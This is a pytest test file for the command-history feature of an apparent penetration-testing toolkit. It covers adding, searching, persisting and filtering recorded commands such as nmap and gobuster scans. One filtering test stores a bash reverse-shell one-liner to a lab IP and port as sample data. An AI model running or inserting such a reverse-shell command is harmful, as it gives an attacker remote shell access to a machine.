"""
Tests for Command History (ch) Tool

Validates:
- Command tracking and storage
- Fuzzy search functionality
- History persistence
- Filter capabilities
- Integration with session
"""

import pytest
import json
from datetime import datetime
from pathlib import Path

from crack.track.interactive.history import CommandHistory
from crack.track.interactive.session import InteractiveSession
from crack.track.core.state import TargetProfile


class TestCommandHistoryBasics:
    """Test basic command history functionality"""

    def test_add_command_to_history(self):
        """PROVES: Commands can be added to history"""
        history = CommandHistory()

        history.add(
            command="nmap -p- 192.168.45.100",
            source="task",
            task_id="nmap-full",
            success=True
        )

        assert len(history.commands) == 1
        assert history.commands[0]['command'] == "nmap -p- 192.168.45.100"
        assert history.commands[0]['source'] == "task"
        assert history.commands[0]['task_id'] == "nmap-full"
        assert history.commands[0]['success'] is True
        assert 'timestamp' in history.commands[0]

    def test_add_multiple_commands(self):
        """PROVES: Multiple commands tracked in order"""
        history = CommandHistory()

        commands = [
            "nmap -p- 192.168.45.100",
            "gobuster dir -u http://192.168.45.100",
            "nikto -h http://192.168.45.100"
        ]

        for cmd in commands:
            history.add(cmd, source="manual", success=True)

        assert len(history.commands) == 3
        assert history.commands[0]['command'] == commands[0]
        assert history.commands[2]['command'] == commands[2]

    def test_history_max_size_limit(self):
        """PROVES: History respects max size limit"""
        history = CommandHistory()
        history.max_size = 10

        # Add 15 commands
        for i in range(15):
            history.add(f"command_{i}", source="test", success=True)

        # Should only keep last 10
        assert len(history.commands) == 10
        assert history.commands[0]['command'] == "command_5"
        assert history.commands[-1]['command'] == "command_14"

    def test_track_command_success_failure(self):
        """PROVES: Success and failure tracked separately"""
        history = CommandHistory()

        history.add("successful_command", source="task", success=True)
        history.add("failed_command", source="task", success=False)

        assert history.commands[0]['success'] is True
        assert history.commands[1]['success'] is False


class TestCommandHistorySearch:
    """Test fuzzy search functionality"""

    def test_search_with_substring(self):
        """PROVES: Substring search works"""
        history = CommandHistory()

        history.add("nmap -p- 192.168.45.100", source="task", success=True)
        history.add("gobuster dir -u http://192.168.45.100", source="task", success=True)
        history.add("nikto -h http://192.168.45.100", source="task", success=True)

        results = history.search("gobuster")

        assert len(results) == 1
        assert results[0][0]['command'] == "gobuster dir -u http://192.168.45.100"
        assert results[0][1] == 80  # Substring match score

    def test_search_with_fuzzy_matcher(self):
        """PROVES: Fuzzy matching works with custom matcher"""
        history = CommandHistory()

        history.add("nmap -sV 192.168.45.100", source="task", success=True)
        history.add("gobuster dir -u http://192.168.45.100", source="task", success=True)

        def fuzzy_matcher(query, text):
            """Simple fuzzy matcher for testing"""
            if query.lower() in text.lower():
                return (True, 80)
            return (False, 0)

        results = history.search("nmap", fuzzy_matcher)

        assert len(results) == 1
        assert results[0][1] == 80

    def test_search_returns_sorted_by_score(self):
        """PROVES: Search results sorted by match quality"""
        history = CommandHistory()

        history.add("nmap -p80 target", source="task", success=True)
        history.add("nmap -sV target", source="task", success=True)
        history.add("gobuster with nmap output", source="task", success=True)

        def score_matcher(query, text):
            """Matcher that returns different scores"""
            if query == text.split()[0]:
                return (True, 100)  # Exact command name match
            elif query in text:
                return (True, 50)  # Contains query
            return (False, 0)

        results = history.search("nmap", score_matcher)

        # Should be sorted descending by score
        assert len(results) == 3
        assert results[0][1] >= results[1][1] >= results[2][1]

    def test_search_no_results(self):
        """PROVES: Search returns empty for no matches"""
        history = CommandHistory()

        history.add("nmap -p- target", source="task", success=True)

        results = history.search("sqlmap")

        assert len(results) == 0

    def test_search_filters_by_min_score(self):
        """PROVES: Search filters out low-scoring matches"""
        history = CommandHistory()

        history.add("nmap -sV target", source="task", success=True)
        history.add("gobuster dir", source="task", success=True)

        def variable_scorer(query, text):
            """Return different scores"""
            if "nmap" in text:
                return (True, 80)  # Above threshold
            else:
                return (True, 30)  # Below threshold

        # min_score is 40 by default
        results = history.search("scan", variable_scorer)

        # Should only return high-scoring match
        assert len(results) == 1
        assert "nmap" in results[0][0]['command']


class TestCommandHistoryRecent:
    """Test recent commands functionality"""

    def test_get_recent_commands(self):
        """PROVES: Can retrieve recent commands"""
        history = CommandHistory()

        for i in range(5):
            history.add(f"command_{i}", source="test", success=True)

        recent = history.get_recent(3)

        assert len(recent) == 3
        # Should be in reverse order (most recent first)
        assert recent[0]['command'] == "command_4"
        assert recent[2]['command'] == "command_2"

    def test_get_recent_limit_exceeds_total(self):
        """PROVES: Recent commands handles limit > total"""
        history = CommandHistory()

        history.add("command_1", source="test", success=True)
        history.add("command_2", source="test", success=True)

        recent = history.get_recent(10)

        assert len(recent) == 2

    def test_get_recent_empty_history(self):
        """PROVES: Recent commands returns empty list"""
        history = CommandHistory()

        recent = history.get_recent(10)

        assert len(recent) == 0


class TestCommandHistoryPersistence:
    """Test serialization and persistence"""

    def test_to_dict_serialization(self):
        """PROVES: History serializes to dict"""
        history = CommandHistory()
        history.add("nmap -p- target", source="task", success=True)
        history.add("gobuster dir", source="manual", success=False)

        data = history.to_dict()

        assert 'commands' in data
        assert 'max_size' in data
        assert len(data['commands']) == 2
        assert data['max_size'] == 100

    def test_from_dict_deserialization(self):
        """PROVES: History deserializes from dict"""
        data = {
            'commands': [
                {
                    'timestamp': '2025-10-08T12:00:00',
                    'command': 'nmap -p- target',
                    'source': 'task',
                    'task_id': 'nmap-full',
                    'success': True
                }
            ],
            'max_size': 50
        }

        history = CommandHistory.from_dict(data)

        assert len(history.commands) == 1
        assert history.commands[0]['command'] == 'nmap -p- target'
        assert history.max_size == 50

    def test_roundtrip_serialization(self):
        """PROVES: History survives roundtrip serialization"""
        original = CommandHistory()
        original.add("command1", source="task", task_id="task1", success=True)
        original.add("command2", source="manual", success=False)

        # Serialize and deserialize
        data = original.to_dict()
        restored = CommandHistory.from_dict(data)

        assert len(restored.commands) == 2
        assert restored.commands[0]['command'] == "command1"
        assert restored.commands[1]['success'] is False


class TestSessionIntegration:
    """Test integration with InteractiveSession"""

    def test_session_initializes_history(self, temp_crack_home, mock_profile):
        """PROVES: Session creates CommandHistory on init"""
        session = InteractiveSession(mock_profile.target)

        assert hasattr(session, 'command_history')
        assert isinstance(session.command_history, CommandHistory)

    def test_history_persists_in_checkpoint(self, temp_crack_home, mock_profile):
        """PROVES: History saved in session checkpoint"""
        session = InteractiveSession(mock_profile.target)

        # Add command to history
        session.command_history.add(
            "nmap -sV target",
            source="task",
            success=True
        )

        # Save checkpoint
        session.save_checkpoint()

        # Load checkpoint in new session
        new_session = InteractiveSession(mock_profile.target, resume=True)

        assert len(new_session.command_history.commands) == 1
        assert new_session.command_history.commands[0]['command'] == "nmap -sV target"

    def test_history_tracks_task_execution(self, temp_crack_home, mock_profile_with_tasks):
        """PROVES: Task execution adds to history"""
        # This is an integration test verifying command tracking
        # In real usage, execute_task() would add commands to history
        session = InteractiveSession(mock_profile_with_tasks.target)

        # Simulate command execution tracking
        session.command_history.add(
            command="nmap -p- 192.168.45.100",
            source="task",
            task_id="nmap-discovery-full",
            success=True
        )

        assert len(session.command_history.commands) == 1
        assert session.command_history.commands[0]['task_id'] == "nmap-discovery-full"


class TestShortcutIntegration:
    """Test 'ch' shortcut integration"""

    def test_ch_shortcut_registered(self):
        """PROVES: 'ch' shortcut is registered"""
        from crack.track.interactive.shortcuts import ShortcutHandler
        from crack.track.interactive.input_handler import InputProcessor

        # Verify in ShortcutHandler
        session = None  # Mock session not needed for registration check
        # We'll just verify the shortcut exists in the handler

        # Verify in InputProcessor
        assert 'ch' in InputProcessor.SHORTCUTS

    def test_shortcut_handler_has_ch_method(self, temp_crack_home, mock_profile):
        """PROVES: ShortcutHandler has command_history method"""
        from crack.track.interactive.shortcuts import ShortcutHandler

        session = InteractiveSession(mock_profile.target)
        handler = ShortcutHandler(session)

        assert 'ch' in handler.shortcuts
        assert handler.shortcuts['ch'][0] == 'Command history'
        assert handler.shortcuts['ch'][1] == 'command_history'
        assert hasattr(handler, 'command_history')


class TestFilterBySource:
    """Test filtering commands by source"""

    def test_filter_by_task_source(self):
        """PROVES: Can filter commands from task execution"""
        history = CommandHistory()

        history.add("nmap -p- target", source="task", success=True)
        history.add("gobuster dir", source="manual", success=True)
        history.add("nikto -h target", source="task", success=True)

        task_commands = [cmd for cmd in history.commands if cmd['source'] == 'task']

        assert len(task_commands) == 2

    def test_filter_by_manual_source(self):
        """PROVES: Can filter manually entered commands"""
        history = CommandHistory()

        history.add("nmap scan", source="task", success=True)
        history.add("custom command 1", source="manual", success=True)
        history.add("custom command 2", source="manual", success=True)

        manual_commands = [cmd for cmd in history.commands if cmd['source'] == 'manual']

        assert len(manual_commands) == 2

    def test_filter_by_template_source(self):
        """PROVES: Can filter commands from templates"""
        history = CommandHistory()

        history.add("bash -i >& /dev/tcp/192.168.45.200/4444 0>&1", source="template", success=True)
        history.add("nmap scan", source="task", success=True)

        template_commands = [cmd for cmd in history.commands if cmd['source'] == 'template']

        assert len(template_commands) == 1


class TestFilterBySuccess:
    """Test filtering by success status"""

    def test_filter_successful_only(self):
        """PROVES: Can filter only successful commands"""
        history = CommandHistory()

        history.add("successful_cmd", source="task", success=True)
        history.add("failed_cmd", source="task", success=False)
        history.add("another_success", source="task", success=True)

        successful = [cmd for cmd in history.commands if cmd['success']]

        assert len(successful) == 2

    def test_filter_failed_only(self):
        """PROVES: Can filter only failed commands"""
        history = CommandHistory()

        history.add("success", source="task", success=True)
        history.add("fail1", source="task", success=False)
        history.add("fail2", source="task", success=False)

        failed = [cmd for cmd in history.commands if not cmd['success']]

        assert len(failed) == 2


# Fixtures
@pytest.fixture
def temp_crack_home(tmp_path, monkeypatch):
    """Create temporary .crack directory"""
    crack_home = tmp_path / '.crack'
    crack_home.mkdir()
    (crack_home / 'targets').mkdir()
    (crack_home / 'sessions').mkdir()
    monkeypatch.setenv('HOME', str(tmp_path))
    return crack_home


@pytest.fixture
def mock_profile(temp_crack_home):
    """Create mock target profile"""
    profile = TargetProfile('192.168.45.100')
    profile.save()
    return profile


@pytest.fixture
def mock_profile_with_tasks(temp_crack_home):
    """Create mock profile with tasks"""
    profile = TargetProfile('192.168.45.100')

    # Add a port to trigger task generation
    profile.add_port(80, state='open', service='http', version='Apache 2.4.41', source='test')

    profile.save()
    return profile
